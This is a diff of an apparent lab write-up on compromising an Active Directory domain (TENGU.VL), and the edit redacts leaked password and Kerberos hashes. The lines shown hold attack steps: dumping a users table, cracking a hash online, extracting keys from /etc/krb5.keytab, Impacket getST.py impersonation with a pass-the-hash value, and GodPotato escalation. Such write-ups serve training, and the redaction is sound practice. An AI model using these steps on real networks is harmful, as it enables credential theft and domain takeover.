@@ -164,7 +164,7 @@ SQL (nodered_connector  nodered_connector@Dev)> use Demo
 SQL (nodered_connector  nodered_connector@Demo)> select * from users;
   ID   Username          Password
 ----   ---------------   -------------------------------------------------------------------
-NULL   b't2_m.winters'   b'af9cfa9b70e5e90984203087e5a5219945a599abf31dd4bb2a11dc20678ea147'
+NULL   b't2_m.winters'   b'af[...]147'
 ```
 We can crack the hash using this site : [https://crackstation.net/](https://crackstation.net/)
 
@@ -236,8 +236,8 @@ root@nodered:~# python3 keytabextract.py /etc/krb5.keytab
         REALM : TENGU.VL
         SERVICE PRINCIPAL : NODERED$/
         NTLM HASH : d4[...]49
-        AES-256 HASH : 4ce11c580289227f38f8cc0225456224941d525d1e525c353ea1e1ec83138096
-        AES-128 HASH : 3e04b61b939f61018d2c27d4dc0b385f
+        AES-256 HASH : 4ce[...]096
+        AES-128 HASH : 3e0[...]85f
 ```
 Nice !!!
 
@@ -253,7 +253,7 @@ LDAP        10.10.208.101   636    DC               Account: gMSA01$            
 Now impersonate Administrator
 
 ```bash
-proxychains -q getST.py -spn 'MSSQLSvc/sql.tengu.vl' 'tengu.vl/gMSA01$' -hashes :'d4b65861e85773fba2035b31ebcacb37' -impersonate 'Administrator'
+proxychains -q getST.py -spn 'MSSQLSvc/sql.tengu.vl' 'tengu.vl/gMSA01$' -hashes :'d4[...]b37' -impersonate 'Administrator'
 Impacket v0.12.0.dev1+20240823.155701.089603e0 - Copyright 2023 Fortra
 
 [-] CCache file is not found. Skipping...
@@ -284,7 +284,7 @@ Impacket v0.12.0.dev1+20240823.155701.089603e0 - Copyright 2023 Fortra
 So instead of Administrator we gonna impersonate a user which is in sql_admins group :
 
 ```bash
-proxychains -q getST.py -spn 'MSSQLSvc/sql.tengu.vl' 'tengu.vl/gMSA01$' -hashes :'d4b65861e85773fba2035b31ebcacb37' -impersonate 't1_m.winters'
+proxychains -q getST.py -spn 'MSSQLSvc/sql.tengu.vl' 'tengu.vl/gMSA01$' -hashes :'d4b[...]b37' -impersonate 't1_m.winters'
 Impacket v0.12.0.dev1+20240823.155701.089603e0 - Copyright 2023 Fortra
 
 [-] CCache file is not found. Skipping...
@@ -324,7 +324,7 @@ Now we can run GodPotato :
 
 Nice !!
 
-After some enumeration we can find ```C:\admin\Task.ps1```,running ```icacls Task.ps1``` :
+After some enumeration we can find ```C:\admin\Task.ps1```, and if we run ```icacls Task.ps1``` :
 
 ```powershell
 PS C:\admin> icacls Task.ps1
